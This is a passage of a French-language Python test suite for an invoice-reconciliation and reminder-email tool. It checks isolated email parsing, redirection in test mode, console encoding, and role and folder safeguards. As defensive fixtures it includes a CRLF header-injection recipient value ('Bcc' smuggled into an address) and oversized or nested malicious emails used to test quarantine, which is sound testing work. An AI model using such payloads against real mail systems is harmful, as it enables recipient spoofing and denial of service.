def test_sans_isolation_mode_test_seulement_et_annonce(entree, inst, monkeypatch, capsys):
    deposer_emls(inst)
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree), "--sans-isolation")
    assert rc == 1 and "IsolationIndisponible" in err and "mode test" in err
    assert cycle.pieces(inst) == []                                    # rien n'a ete ecrit
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree), "--sans-isolation",
                     "--isolation", "spawn", "--mode-test")
    assert rc == 1 and "contredit" in err
    appels = []
    for nom in ("_lire_eml_isole", "_lire_eml_spawn"):
        monkeypatch.setattr(cycle, nom, lambda *a, _n=nom: appels.append(_n) or pytest.fail("enfant lance"))
    rc, out, _ = cli(capsys, inst, "cycle", "--entree", str(entree), "--sans-isolation", "--mode-test")
    assert rc == 0 and appels == []
    assert "AVERTISSEMENT : aucune isolation : les e-mails sont lus dans le processus principal" in out
    (degradee,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "isolation_degradee"]
    assert degradee.details["niveau"] == "aucune" and degradee.details["strategie"] == "directe"
    assert lire_csv(inst.sortie / "file_humaine.csv")                  # les messages sont bien routes
    # Meme en mode test, une bombe est rattrapee comme exception (pas de protection memoire/temps).
    (inst.entrant / "0-bombe.eml").write_bytes(_imbrique(1000))
    r = lancer(entree, inst, jour(1), mode_test=True, strategie_isolation="directe")
    assert r.quarantaine == 1 and r.strategie_isolation == "directe"


def test_le_travailleur_spawn_est_serialisable_et_l_enfant_retrouve_sys_path():
    import multiprocessing.spawn as mp_spawn

    assert cycle._enfant_lire_eml_spawn.__module__ == "rapprochement.cycle"
    assert "<locals>" not in cycle._enfant_lire_eml_spawn.__qualname__          # niveau module
    assert pickle.loads(pickle.dumps(cycle._enfant_lire_eml_spawn)) is cycle._enfant_lire_eml_spawn
    src = str(RACINE / "src")
    assert src in sys.path and src in mp_spawn.get_preparation_data("x")["sys_path"]
    message = cycle.MessageEntrant(
        "<m@x>", "a@b.fr", dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc), "objet", "corps",
        (cycle.routage.FichierEntrant("f.pdf", b"\x00\xff%PDF"),))
    assert pickle.loads(pickle.dumps(message)) == message                       # bytes compris


def test_spawn_lit_un_vrai_message_et_laisse_le_parent_intact(tmp_path):
    chemin = ecrire_eml(tmp_path, "m.eml", expediteur=ORIGINE, message_id="<s@x>", corps="120,00 EUR",
                        fichiers=(("a.pdf", b"%PDF-a"), ("b.pdf", b"%PDF-b")))
    message = cycle._lire_eml_spawn(chemin, 5)
    assert message == cycle.routage.lire_eml(chemin) and len(message.fichiers) == 2
    assert _enfants_vivants() == []


def test_spawn_attaque_tuee_au_delai_de_garde_le_reste_du_lot_traite(entree, inst, monkeypatch):
    # Delai serre pour la seule attaque : un fichier legitime ne doit jamais y etre soumis
    # (le demarrage d'un interpreteur spawn est lent sur une machine chargee).
    monkeypatch.setattr(cycle, "MARGE_GARDE_LECTURE_EML", 1.5)
    monkeypatch.setattr(cycle, "MARGE_DEMARRAGE_SPAWN", 0.0)
    (inst.entrant / "0-lourd.eml").write_bytes(_partie_nom_encode(16000, "p218@x"))    # 218 Ko : ~19 s
    rss_avant = _rss_parent_ko()
    t = time.perf_counter()
    r = lancer(entree, inst, J0, mode_test=True, strategie_isolation="spawn", limite_cpu_eml=1)
    assert time.perf_counter() - t < 12.0
    assert _rss_parent_ko() - rss_avant < 100 * 1024
    (q,) = lire_csv(inst.sortie / "quarantaine.csv")
    assert q["nom_fichier"] == "0-lourd.eml" and "interrompue" in q["raison"] and "Traceback" not in q["raison"]
    assert (r.quarantaine, r.messages_lus) == (1, 0)
    assert _enfants_vivants() == []
    # Le reste du lot, ensuite, avec les delais normaux : l'attaque, toujours la, est remise en
    # quarantaine (elle est retentee a chaque cycle) et le message legitime est traite.
    monkeypatch.undo()
    ecrire_eml(inst.entrant, "1-ok.eml", expediteur=ORIGINE, message_id="<ok@a>", corps="120,00 EUR",
               fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
    (inst.entrant / "0-lourd.eml").unlink()                          # retire par un humain
    r = lancer(entree, inst, J0, mode_test=True, strategie_isolation="spawn")
    assert (r.quarantaine, r.propositions, r.messages_lus) == (0, 1, 1)
    assert _enfants_vivants() == []


# --- ExpediteurTest ---------------------------------------------------------


class Espion:
    def __init__(self):
        self.recus = []

    def envoyer(self, brouillon):
        self.recus.append(brouillon)
        return "ext-1"


def _brouillon_de_test(destinataire: str = ORIGINE) -> Brouillon:
    return Brouillon(identifiant_relance(destinataire, ("A-001",), 1, J0), destinataire,
                     "Justificatifs - 1 justificatif(s)", "Bonjour,\n\n  - 03/09/2026  120,00 EUR", ("ALPHA",),
                     ("A-001",), 1, J0, StatutBrouillon.EN_COURS, "Marie Durand")


def test_expediteur_test_copie_sans_toucher_l_original():
    reel = Espion()
    b = _brouillon_de_test()
    assert cycle.ExpediteurTest(reel, ADRESSE_TEST).envoyer(b) == "ext-1"
    (copie,) = reel.recus
    assert copie.destinataire == ADRESSE_TEST and copie.objet == "[TEST] Justificatifs - 1 justificatif(s)"
    assert copie.corps.splitlines()[0] == f"[TEST] Destinataire d'origine : {ORIGINE}"
    assert copie.corps.endswith(b.corps) and copie.id_relance == b.id_relance
    assert (b.destinataire, b.objet) == (ORIGINE, "Justificatifs - 1 justificatif(s)")     # original intact
    assert cycle.ExpediteurTest(reel).adresse_test == ADRESSE_TEST
    hostile = dataclasses_replace(b, destinataire="a@b.fr\r\nBcc: x@y.fr")
    cycle.ExpediteurTest(reel, ADRESSE_TEST).envoyer(hostile)
    assert len(reel.recus[-1].corps.splitlines()[0].splitlines()) == 1                    # une seule ligne
    for mauvaise in ("", "pas d'adresse", "a@b.fr, c@d.fr", None):
        with pytest.raises(cycle.ErreurCycle):
            cycle.ExpediteurTest(reel, mauvaise)


def dataclasses_replace(objet, **champs):
    import dataclasses
    return dataclasses.replace(objet, **champs)


def _eml_sorti(inst: cycle.Instance, id_relance: str):
    import email
    import email.policy
    brut = (inst.outbox / f"{id_relance}.eml").read_bytes()
    return email.message_from_bytes(brut, policy=email.policy.default), brut


def test_envoi_en_mode_test_ecrit_a_l_adresse_de_test_jamais_au_client(entree, inst):
    ecrire_config(inst, mode_test=True, adresse_test="essai@exemple.invalid")
    lancer(entree, inst, J0)
    b = next(x for x in cycle.brouillons(inst) if x.destinataire == ORIGINE)
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    envoye = cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    msg, brut = _eml_sorti(inst, b.id_relance)
    assert msg["To"] == "essai@exemple.invalid"
    assert msg["Subject"].startswith("[TEST] ")
    corps = msg.get_content()
    assert corps.splitlines()[0] == f"[TEST] Destinataire d'origine : {ORIGINE}"
    en_tetes = brut.split(b"\r\n\r\n", 1)[0].decode()
    assert ORIGINE not in en_tetes                                      # ni To, ni Cc, ni aucun en-tete
    assert [h for h, v in msg.items() if ORIGINE in str(v)] == []
    # Le brouillon et l'historique restent ceux du VRAI destinataire.
    assert envoye.destinataire == ORIGINE and envoye.objet == b.objet and envoye.corps == b.corps
    assert cycle.brouillons(inst, StatutBrouillon.ENVOYEE)[0].destinataire == ORIGINE
    with Depot(inst.depot) as d:
        assert [e.destinataire for e in d.historique_envois()] == [ORIGINE]
    (trace,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "envoi_mode_test"]
    assert trace.details == {"destinataire_reel": ORIGINE, "adresse_test": "essai@exemple.invalid"}
    # La limite hebdomadaire continue de s'appliquer au VRAI destinataire.
    autre = Brouillon(identifiant_relance(ORIGINE, ("A-002",), 1, J0), ORIGINE, "Autre", "x", ("ALPHA",),
                      ("A-002",), 1, J0)
    with Depot(inst.depot) as d:
        d.sauver_brouillon(autre)
    cycle.valider_relance(inst, autre.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    with pytest.raises(cycle.EnvoiRefuse, match="un e-mail par 7 jours"):
        cycle.envoyer_relance(inst, autre.id_relance, maintenant=a_10h(jour(1)))
    assert emls(inst) == [f"{b.id_relance}.eml"]


def test_envoi_mode_test_enveloppe_aussi_un_expediteur_fourni_et_le_drapeau_cli(entree, inst, capsys):
    ecrire_config(inst, mode_test=True)          # le mode est fige par instance : celle-ci est une instance de test
    lancer(entree, inst, J0)
    b1, b2 = sorted(cycle.brouillons(inst), key=lambda x: x.destinataire)
    for b in (b1, b2):
        cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    espion = Espion()
    cycle.envoyer_relance(inst, b1.id_relance, maintenant=a_10h(J0), expediteur=espion, mode_test=True)
    assert [x.destinataire for x in espion.recus] == [ADRESSE_TEST] and espion.recus[0].objet.startswith("[TEST] ")
    rc, out, _ = cli(capsys, inst, "envoyer", b2.id_relance, "--mode-test", "--par", VALIDEUSE)
    assert rc == 0 and f"[MODE TEST] {b2.id_relance} envoye a {ADRESSE_TEST}" in out
    assert f"destinataire reel, NON contacte : {b2.destinataire}" in out
    msg, _ = _eml_sorti(inst, b2.id_relance)
    assert msg["To"] == ADRESSE_TEST and b2.destinataire not in str(msg["To"])


def test_envoi_hors_mode_test_inchange(entree, inst):
    lancer(entree, inst, J0)
    b = next(x for x in cycle.brouillons(inst) if x.destinataire == ORIGINE)
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    msg, _ = _eml_sorti(inst, b.id_relance)
    assert msg["To"] == ORIGINE and not msg["Subject"].startswith("[TEST]")
    assert "envoi_mode_test" not in actions_audit(inst)


# --- Console Windows (cp1252) -----------------------------------------------


def _cli_en_sous_processus(args: list[str], codage: str = "cp1252") -> subprocess.CompletedProcess:
    env = {k: v for k, v in os.environ.items() if k != "PYTHONPATH"}
    env["PYTHONIOENCODING"] = codage              # console Windows en cp1252, strict comme un vrai terminal
    return subprocess.run([sys.executable, str(RACINE / "scripts" / "cycle.py"), *args],
                          capture_output=True, env=env, timeout=120)


def test_console_cp1252_le_cli_ne_plante_pas_sur_un_caractere_hors_page_de_codes(entree, inst):
    temoin = subprocess.run([sys.executable, "-c", "print('日本語 Ж ☃')"], capture_output=True,
                            env={**os.environ, "PYTHONIOENCODING": "cp1252"})
    assert temoin.returncode != 0 and b"UnicodeEncodeError" in temoin.stderr     # le probleme est reel
    nom = "facture_日本語_Ж_☃.pdf"
    ecrire_eml(inst.entrant, "1.eml", expediteur="inconnu@gmail.com", message_id="<jp@x>",
               fichiers=((nom, b"%PDF"),))
    lancer(entree, inst, J0)
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    r = _cli_en_sous_processus(["file", *base])
    assert r.returncode == 0, r.stderr.decode("utf-8", "replace")
    assert nom in r.stdout.decode("utf-8")                                       # octets UTF-8, rien de perdu
    r = _cli_en_sous_processus(["arbitrer", *base, "--dossier", "ALPHA", "--reference", "日本語-Ж",
                                "--motif", "x", "--par", RESPONSABLE])
    assert r.returncode == 1 and "Traceback" not in r.stderr.decode("utf-8")
    assert "ALPHA/日本語-Ж" in r.stderr.decode("utf-8")                           # message d'erreur compris
    cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="litige 日本語", maintenant=a_10h(J0))
    r = _cli_en_sous_processus(["pieces", *base])
    assert r.returncode == 0 and "litige 日本語" in r.stdout.decode("utf-8")


def test_console_utf8_flux_sans_reconfigure_ou_ferme(monkeypatch):
    cli_module = charger_cli()

    class SansReconfigure:
        pass

    class Ferme:
        def reconfigure(self, **_):
            raise ValueError("I/O operation on closed file")

    flux = io.TextIOWrapper(io.BytesIO(), encoding="cp1252", errors="strict")
    monkeypatch.setattr(sys, "stdout", flux)
    monkeypatch.setattr(sys, "stderr", SansReconfigure())
    cli_module._console_utf8()
    assert (flux.encoding, flux.errors) == ("utf-8", "replace")
    flux.write("日本語 \udcff")                                                    # ni exception, ni perte de flux
    monkeypatch.setattr(sys, "stdout", Ferme())
    cli_module._console_utf8()


# ---------------------------------------------------------------------------
# Audit de conformite : A7 (CA-03), A1 (D6), A14 (roles), A15, A17, A10, A8, envoi nominatif,
# garde-fous du mode test (attaque ET cas nominal, chaque garde verifiee par mutation)
# ---------------------------------------------------------------------------


def _proposition_alpha(inst: cycle.Instance, entree: Path, **kw):
    """Un message d'ALPHA qui propose A-001 ; renvoie la decision de la file."""
    lancer(entree, inst, J0, **kw)
    ecrire_eml(inst.entrant, "1.eml", expediteur=ORIGINE, message_id="<loxam@a>", corps="120,00 EUR",
               fichiers=(("loxam_2026-09-03.pdf", b"%PDF-loxam"),))
    lancer(entree, inst, jour(1), **kw)
    (d,) = cycle.lister_file(inst)
    assert d.statut is StatutRoutage.PROPOSEE and d.dossier == "ALPHA" and d.reference_operation == "A-001"
    return d


# --- A7 : rattachement inter-dossiers --------------------------------------


def test_a7_rattacher_refuse_un_dossier_different_de_la_decision(entree, inst):
    d = _proposition_alpha(inst, entree)
    avant = etat_depot(inst)
    m = a_10h(jour(1))
    with pytest.raises(cycle.ErreurCycle, match="designe le dossier ALPHA, pas BETA") as exc:
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=m, message_id=d.message_id,
                              dossier="BETA", reference="B-001")
    assert "--forcer" in str(exc.value)
    assert etat_depot(inst) == avant                                  # ni piece, ni file modifiees
    assert pieces_par_ref(inst)["B-001"].etat is EtatPiece.ATTENDUE
    (refus,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "rattachement_refuse"]
    assert refus.acteur == VALIDEUSE and refus.details["dossier_origine"] == "ALPHA"
    assert refus.details["dossier_cible"] == "BETA" and refus.details["message_id"] == "<loxam@a>"
    assert JournalAudit(inst.audit).verifier().ok


@pytest.mark.parametrize("motif", ["", "   ", None])
def test_a7_forcer_sans_motif_refuse(entree, inst, motif):
    d = _proposition_alpha(inst, entree)
    avant = etat_depot(inst)
    with pytest.raises(cycle.ErreurCycle, match="--forcer exige un --motif non vide"):
        cycle.rattacher_piece(inst, RESPONSABLE, maintenant=a_10h(jour(1)), message_id=d.message_id,
                              dossier="BETA", reference="B-001", forcer=True, motif=motif)
    assert etat_depot(inst) == avant
    assert "rattachement_force" not in actions_audit(inst)


def test_a7_forcer_avec_motif_rattache_et_journalise(entree, inst):
    d = _proposition_alpha(inst, entree)
    p = cycle.rattacher_piece(inst, RESPONSABLE, maintenant=a_10h(jour(1)), message_id=d.message_id,
                              dossier="BETA", reference="B-001", forcer=True,
                              motif="  Facture mal adressee par le client, verifiee par telephone ")
    assert (p.dossier, p.reference, p.etat) == ("BETA", "B-001", EtatPiece.RECUE)
    assert cycle.lister_file(inst) == []                              # decision resolue
    (force,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "rattachement_force"]
    assert force.acteur == RESPONSABLE and force.objet == "BETA/B-001"
    assert force.details["dossier_origine"] == "ALPHA" and force.details["dossier_cible"] == "BETA"
    assert force.details["motif"] == "Facture mal adressee par le client, verifiee par telephone"
    assert force.details["message_id"] == "<loxam@a>" and force.details["par"] == RESPONSABLE
    assert "rattachement_confirme" in actions_audit(inst)
    assert JournalAudit(inst.audit).verifier().ok


def test_a7_rattachement_normal_inchange(entree, inst):
    for variante in ("defaut", "explicite", "forcer_inutile"):
        rep = inst.racine.parent / f"i_{variante}"
        instance = nouvelle_instance(rep)
        d = _proposition_alpha(instance, entree)
        kw = {"explicite": {"dossier": "ALPHA"},
              "forcer_inutile": {"dossier": "ALPHA", "forcer": True}}.get(variante, {})
        par = RESPONSABLE if variante == "forcer_inutile" else VALIDEUSE     # forcer : responsable, meme inutile
        p = cycle.rattacher_piece(instance, par, maintenant=a_10h(jour(1)),
                                  message_id=d.message_id, **kw)
        assert (p.dossier, p.reference, p.etat) == ("ALPHA", "A-001", EtatPiece.RECUE), variante
        actions = actions_audit(instance)
        assert "rattachement_force" not in actions and "rattachement_refuse" not in actions, variante


def test_a7_decision_non_routee_avec_dossier_connu_aussi_protegee(entree, inst):
    lancer(entree, inst, J0)
    ecrire_eml(inst.entrant, "1.eml", expediteur=ORIGINE, message_id="<flou@a>", corps="Facture 999,99 EUR",
               fichiers=(("facture.pdf", b"%PDF-x"),))
    lancer(entree, inst, jour(1))
    (d,) = cycle.lister_file(inst)
    assert d.statut is StatutRoutage.NON_ROUTEE and d.dossier == "ALPHA"
    with pytest.raises(cycle.ErreurCycle, match="designe le dossier ALPHA, pas BETA"):
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), message_id=d.message_id,
                              dossier="BETA", reference="B-001")
    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), message_id=d.message_id,
                              dossier="ALPHA", reference="A-002")      # meme dossier : libre
    assert (p.dossier, p.etat) == ("ALPHA", EtatPiece.RECUE)


def test_a7_expediteur_inconnu_sans_dossier_d_origine_reste_libre(entree, inst):
    """Aucune decision de dossier a comparer : l'humain choisit (le cas ordinaire du relais)."""
    lancer(entree, inst, J0)
    ecrire_eml(inst.entrant, "1.eml", expediteur="pieces@cabinet-relais.fr", message_id="<r@x>",
               corps="230,40 EUR", fichiers=(("metro.pdf", b"%PDF-m"),))
    lancer(entree, inst, jour(1))
    (d,) = cycle.lister_file(inst)
    assert d.dossier is None
    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), message_id=d.message_id,
                              dossier="BETA", reference="B-001")
    assert (p.dossier, p.etat) == ("BETA", EtatPiece.RECUE)
    assert "rattachement_force" not in actions_audit(inst)


def test_a7_cli_refus_forcage_et_options_incoherentes(entree, inst, capsys):
    d = _proposition_alpha(inst, entree)
    base = ["--message-id", d.message_id, "--par", RESPONSABLE]
    rc, _, err = cli(capsys, inst, "rattacher", *base, "--dossier", "BETA", "--reference", "B-001", date=jour(1))
    assert rc == 1 and "REFUS (ErreurCycle)" in err and "designe le dossier ALPHA, pas BETA" in err
    rc, _, err = cli(capsys, inst, "rattacher", *base, "--dossier", "BETA", "--reference", "B-001",
                     "--forcer", date=jour(1))
    assert rc == 1 and "--forcer exige un --motif" in err
    rc, _, err = cli(capsys, inst, "rattacher", *base, "--motif", "x", date=jour(1))
    assert rc == 1 and "--motif n'a de sens qu'avec --forcer" in err
    assert pieces_par_ref(inst)["B-001"].etat is EtatPiece.ATTENDUE and cycle.lister_file(inst)
    rc, out, _ = cli(capsys, inst, "rattacher", *base, "--dossier", "BETA", "--reference", "B-001",
                     "--forcer", "--motif", "verifie par telephone", date=jour(1))
    assert rc == 0 and "BETA/B-001 -> recue" in out


# --- A1 : circuit obligatoire (decision D6) ---------------------------------


def test_a1_corpus_sans_circuit_refuse_hors_mode_test_avant_toute_ecriture(tmp_path, capsys):
    corpus = corpus_sans_circuit(tmp_path / "corpus_sans_circuit")
    assert "circuit" not in (corpus / "dossiers.csv").read_text(encoding="utf-8").splitlines()[0]
    inst = cycle.Instance(tmp_path / "jamais")
    with pytest.raises(cycle.ErreurFormat, match="circuit manquant pour MARTIN-BTP"):
        cycle.executer_cycle(corpus, inst, J0, a_10h(J0))
    assert not inst.racine.exists()
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(corpus))
    assert rc == 1 and "REFUS [cycle]" in err and "circuit manquant" in err and "dossiers.csv" in err
    assert not inst.racine.exists()


def test_a1_une_seule_cellule_circuit_vide_suffit_a_refuser(tmp_path):
    dossiers = [list(d) for d in DOSSIERS]
    dossiers[0][6] = ""                                              # ALPHA : circuit vide
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers)
    inst = nouvelle_instance(tmp_path / "i")
    with pytest.raises(cycle.ErreurFormat, match="circuit manquant pour ALPHA"):
        lancer(entree, inst, J0)
    assert not inst.depot.exists() and not inst.audit.exists()      # refus AVANT toute ecriture


def test_a1_mode_test_garde_c_direct_mais_avertit_et_journalise(tmp_path):
    corpus = corpus_sans_circuit(tmp_path / "corpus_sans_circuit")
    inst = nouvelle_instance(tmp_path / "i")
    r = lancer(corpus, inst, J0, mode_test=True)
    assert r.pieces_creees == 23 and r.brouillons_crees == 3                 # comportement historique
    attendu = ("circuit absent pour 3 dossier(s), C-DIRECT par defaut : ATELIER-9, LOPEZ-CONSEIL, "
               "MARTIN-BTP (hors mode test : refus, decision D6)")
    assert r.alertes == [attendu] and f"AVERTISSEMENT : {attendu}" in r.texte().splitlines()
    assert f"AVERTISSEMENT : {attendu}" in (inst.sortie / "resume.txt").read_text().splitlines()
    (trace,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "circuit_par_defaut"]
    assert trace.details["dossiers"] == ["ATELIER-9", "LOPEZ-CONSEIL", "MARTIN-BTP"]
    assert {b.destinataire for b in cycle.brouillons(inst)} == {
        "contact@atelier9.fr", "s.lopez@lopez-conseil.fr", "compta@martin-batiment.fr"}


def test_a1_circuit_explicite_aucune_alerte(entree, inst):
    r = lancer(entree, inst, J0, mode_test=True)
    assert r.alertes == [] and "circuit_par_defaut" not in actions_audit(inst)
    assert cycle.dossiers_sans_circuit(entree / "dossiers.csv") == []
    assert cycle.dossiers_sans_circuit(RACINE / "data" / "corpus" / "dossiers.csv") == []   # corpus tel quel
    assert cycle.dossiers_sans_circuit(corpus_sans_circuit(entree.parent / "sans") / "dossiers.csv") == [
        "ATELIER-9", "LOPEZ-CONSEIL", "MARTIN-BTP"]
    r = lancer(RACINE / "data" / "corpus", nouvelle_instance(entree.parent / "i_corpus"), J0)   # accepte hors mode test
    assert r.alertes == [] and r.pieces_creees == 23


# --- A14 : roles (validateurs / responsables) -------------------------------


def _pret_pour_arbitrage(entree: Path, inst: cycle.Instance) -> None:
    for n in (0, 7, 14):
        lancer(entree, inst, jour(n))
        valider_et_envoyer(inst, jour(n))
    lancer(entree, inst, jour(18))
    assert _etats(inst) == {(EtatPiece.ESCALADEE, 3)}


def test_a14_un_simple_validateur_ne_peut_pas_arbitrer_trancher_ni_reparer(entree, inst):
    _pret_pour_arbitrage(entree, inst)
    m = a_10h(jour(18))
    avant = etat_depot(inst)
    with pytest.raises(cycle.ValidateurRefuse, match=r"n'est pas dans responsables\.txt"):
        cycle.arbitrer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="classe", maintenant=m)
    with pytest.raises(cycle.ValidateurRefuse, match=r"responsables\.txt"):
        cycle.trancher_envoi(inst, "abc", VALIDEUSE, parti=True, maintenant=m)
    with pytest.raises(cycle.ValidateurRefuse, match=r"responsables\.txt"):
        cycle.reparer_audit(inst, VALIDEUSE, maintenant=m)
    assert etat_depot(inst) == avant
    p = cycle.arbitrer_piece(inst, "ALPHA", "A-001", RESPONSABLE, motif="classe", maintenant=m)
    assert p.etat is EtatPiece.CLOSE_SANS_SUITE


def test_a14_sans_responsables_txt_refus_hors_mode_test_meme_pour_un_validateur(entree, inst):
    _pret_pour_arbitrage(entree, inst)
    inst.responsables.unlink()
    m = a_10h(jour(18))
    for appel in (
        lambda: cycle.arbitrer_piece(inst, "ALPHA", "A-001", RESPONSABLE, motif="x", maintenant=m),
        lambda: cycle.trancher_envoi(inst, "abc", RESPONSABLE, parti=True, maintenant=m),
        lambda: cycle.reparer_audit(inst, RESPONSABLE, maintenant=m),
    ):
        with pytest.raises(cycle.ValidateurRefuse, match=r"responsables\.txt est absent"):
            appel()
    assert cycle.avertissement_roles(inst) is None
    # Fichier present mais vide : refus aussi, mode test compris (jamais d'acceptation par defaut).
    inst.responsables.write_text("\n# personne\n", encoding="utf-8")
    with pytest.raises(cycle.ValidateurRefuse, match="aucun responsable declare"):
        cycle.arbitrer_piece(inst, "ALPHA", "A-001", RESPONSABLE, motif="x", maintenant=m)
    # (le meme refus en mode test se prouve sur une instance de test : voir le test suivant)


def test_a14_responsables_txt_vide_refuse_aussi_en_mode_test(entree, inst):
    ecrire_config(inst, mode_test=True)
    _pret_pour_arbitrage(entree, inst)
    inst.responsables.write_text("\n# personne\n", encoding="utf-8")
    for mode in (False, True):
        with pytest.raises(cycle.ValidateurRefuse, match="aucun responsable declare"):
            cycle.arbitrer_piece(inst, "ALPHA", "A-001", RESPONSABLE, motif="x",
                                 maintenant=a_10h(jour(18)), mode_test=mode)


def test_a14_mode_test_sans_responsables_txt_repli_annonce_et_journalise(entree, inst, capsys):
    ecrire_config(inst, mode_test=True)          # instance de test des le premier cycle (mode fige)
    _pret_pour_arbitrage(entree, inst)
    inst.responsables.unlink()
    m = a_10h(jour(18))
    assert "mode test" in cycle.avertissement_roles(inst, mode_test=True)
    p = cycle.arbitrer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="classe", maintenant=m, mode_test=True)
    assert p.etat is EtatPiece.CLOSE_SANS_SUITE
    (repli,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "repli_roles_mode_test"]
    assert repli.acteur == VALIDEUSE and repli.objet == "arbitrer"
    with pytest.raises(cycle.ValidateurRefuse, match="Mallory"):
        cycle.arbitrer_piece(inst, "ALPHA", "A-002", "Mallory", motif="x", maintenant=m, mode_test=True)
    ecrire_config(inst, mode_test=True)                              # config.json suffit aussi
    rc, out, _ = cli(capsys, inst, "arbitrer", "--dossier", "ALPHA", "--reference", "A-002", "--motif", "x",
                     "--par", VALIDEUSE, date=jour(18))
    assert rc == 0 and "AVERTISSEMENT : responsables.txt absent" in out
    rc, out, _ = cli(capsys, inst, "reparer-audit", "--par", VALIDEUSE, date=jour(18))
    assert rc == 0 and out.startswith("AVERTISSEMENT : responsables.txt absent")


def test_a14_un_responsable_est_aussi_accepte_pour_les_operations_de_validateur(entree, inst):
    inst.responsables.write_text("﻿Claire Responsable\r\n", encoding="utf-8")   # BOM + CRLF
    inst.validateurs.write_text("Marie Durand\n", encoding="utf-8")                  # Claire n'y est pas
    assert cycle.lire_responsables(inst) == ("Claire Responsable",)
    assert cycle.exiger_validateur(inst, "claire responsable") == "Claire Responsable"
    assert cycle.exiger_responsable(inst, "CLAIRE RESPONSABLE") == "Claire Responsable"
    lancer(entree, inst, J0)
    b = next(x for x in cycle.brouillons(inst) if x.destinataire == ORIGINE)
    assert cycle.valider_relance(inst, b.id_relance, "Claire Responsable", maintenant=a_10h(J0)).valide_par == \
        "Claire Responsable"
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), par="Claire Responsable")
    cycle.rattacher_piece(inst, "Claire Responsable", maintenant=a_10h(J0), dossier="BETA",
                          reference="B-001", id_piece="P-9")
    with pytest.raises(cycle.ValidateurRefuse):                      # et le contraire reste faux
        cycle.exiger_responsable(inst, "Marie Durand")


def test_a14_cli_arbitrer_par_un_validateur_refuse(entree, inst, capsys):
    _pret_pour_arbitrage(entree, inst)
    args = ["--dossier", "ALPHA", "--reference", "A-001", "--motif", "x"]
    rc, _, err = cli(capsys, inst, "arbitrer", *args, "--par", VALIDEUSE, date=jour(18))
    assert rc == 1 and "REFUS (ValidateurRefuse)" in err and "responsables.txt" in err
    rc, out, _ = cli(capsys, inst, "arbitrer", *args, "--par", "paul martin", date=jour(18))
    assert rc == 0 and "close_sans_suite" in out


# --- A15 : alias fournisseurs ------------------------------------------------


def _entree_amazon(rep: Path, alias: str | None) -> Path:
    entree = ecrire_entree(rep, operations=[["ALPHA", "2026-09-10", "CB AMZN MKTPLACE 4471", "89.90", "A-AMZ"]],
                           pieces=[["P-1", "ALPHA", "amazon.pdf", "Amazon EU Sarl", "2026-09-09", "89.90",
                                    "EUR", "2026-09-11", "email"]])
    if alias is not None:
        (entree / "alias_fournisseurs.csv").write_text(alias, encoding="utf-8")
    return entree


def test_a15_un_libelle_abrege_n_est_apparie_qu_avec_l_alias(tmp_path):
    sans = lancer(_entree_amazon(tmp_path / "e1", None), nouvelle_instance(tmp_path / "i1"), J0)
    assert (sans.a_verifier, sans.manquants) == (1, 0)                     # peu sur : humain
    avec_entree = _entree_amazon(tmp_path / "e2", "alias,fournisseur\r\namzn mktplace,Amazon EU Sarl\r\n")
    inst = nouvelle_instance(tmp_path / "i2")
    avec = lancer(avec_entree, inst, J0)
    assert (avec.a_verifier, avec.manquants) == (0, 0)                     # justifiee sans intervention
    suivi = lire_csv(inst.sortie / "tableau_suivi.csv")
    assert [(l["reference"], l["statut"]) for l in suivi] == [("A-AMZ", "justifie")]
    assert cycle.lire_entrees(avec_entree).alias == {"amzn mktplace": "Amazon EU Sarl"}
    assert cycle.lire_entrees(tmp_path / "e1").alias == {}                 # fichier absent : aucun alias


@pytest.mark.parametrize("contenu, attendu", [
    ("alias;fournisseur\namzn;Amazon\n", "colonnes manquantes"),          # message de parseurs.lire_alias
    ("alias,fournisseur\n,Amazon EU Sarl\n", "ligne 2 .* obligatoires"),
    ("alias,fournisseur\namzn mktplace,\n", "ligne 2 .* obligatoires"),
    ("alias,fournisseur\nab,Amazon EU Sarl\n", "trop court"),                # garde du cycle
    ("alias,fournisseur\n-- --,Amazon EU Sarl\n", "vide une fois normalise"),   # refuse par le parseur
])
def test_a15_alias_malforme_refus_lisible_avant_toute_ecriture(tmp_path, capsys, contenu, attendu):
    entree = _entree_amazon(tmp_path / "e", contenu)
    inst = cycle.Instance(tmp_path / "jamais")
    with pytest.raises(cycle.ErreurFormat, match=attendu) as exc:
        cycle.executer_cycle(entree, inst, J0, a_10h(J0))
    assert "alias_fournisseurs.csv" in str(exc.value) and not inst.racine.exists()
    rc, _, err = cli(capsys, inst, "cycle", "--entree", str(entree))
    assert rc == 1 and "REFUS [cycle]" in err and "alias_fournisseurs.csv" in err and not inst.racine.exists()


# Etat initial (defaut corrige, test de regression) : parseurs.lire_alias laissait un meme alias
# associe a DEUX fournisseurs ecraser silencieusement la premiere ligne ({'amzn mktplace': 'B'}) ;
# ce test etait un xfail strict, devenu rouge (XPASS) quand le parseur a refuse le doublon.
def test_a15_regression_alias_en_double_vers_deux_fournisseurs(tmp_path):
